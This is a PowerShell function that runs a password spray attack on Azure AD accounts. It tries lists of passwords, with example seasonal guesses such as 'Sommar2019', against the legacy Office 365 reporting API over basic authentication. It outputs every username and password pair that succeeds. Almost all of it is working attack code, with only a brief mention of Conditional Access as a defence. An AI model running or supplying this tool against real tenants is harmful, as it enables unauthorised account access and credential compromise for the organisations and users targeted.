function Invoke-AzureAdPasswordSprayAttack {
<#
    .SYNOPSIS
        Perform a password spray attack against Azure AD.
    
    .DESCRIPTION
        The script will perform a password spray attack against Azure AD (using the legacy Office 365 reporting API is used with basic authentication). This script will not work if legacy authentication in Azure AD is blocked. Use Conditional Access to protect your organisation.
        
        Specify a list of usernames (email addresses) to attack with the -UserName parameter. Specify passwords to try with the -Password parameter. If you try more than four passwords, users may be blocked by Smart Lockout in Azure AD.
    
    .PARAMETER UserNames
        An array of one or more usernames to attack.

    .PARAMETER Passwords
        An array of one or more passwords to try. Don't lock users out!
    
    .EXAMPLE
        $UserNames = "user1@example.com",
        "user2@example.com",
        "user3@example.com",
        "user4@example.com"

        $Passwords = "Sommar2019", "Sommar2020", "Sommar2019!", "Sommar2020!"

        Invoke-AzureAdPasswordSprayAttack -UserNames $UserNames -Passwords $Passwords
        
#>

    param ($UserNames, $Passwords)

    Write-Verbose -Verbose -Message "Starting password spray attack ($($UserNames.Count) users)..."

    # Set progress counter.
    $i = 0

    Write-Progress -Activity "Running password spray attack" -Status "0% complete:" -PercentComplete 0;

    foreach ($UserName in $UserNames) {
        # Try every password.
        foreach ($Password in $Passwords) {
            # Convert password to secure string.
            $SecureString = $Password | ConvertTo-SecureString -AsPlainText -Force
    
            # Create PSCredential object from username and password.
            $Cred = New-Object System.Management.Automation.PSCredential($UserName, $SecureString)
    
            # Try to connect to Office 365 reporting API with basic authentication.
            try {
                Invoke-WebRequest -Uri "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" -Credential $Cred | Out-Null
    
                # Create custom object.
                $UserObject = New-Object -TypeName psobject
                $UserObject | Add-Member -MemberType NoteProperty -Name "UserName" -Value $UserName
                $UserObject | Add-Member -MemberType NoteProperty -Name "Password" -Value $Password
    
                $UserObject
            } catch {
                # Do nothing.
            }
        }

        # Add to counter.
        $i++

        # Write progress.
        Write-Progress -Activity "Running password spray attack" -Status "$([math]::Round($i / $UserNames.Count * 100))% complete:" -PercentComplete ([math]::Round($i / $UserNames.Count * 100));
    }
}
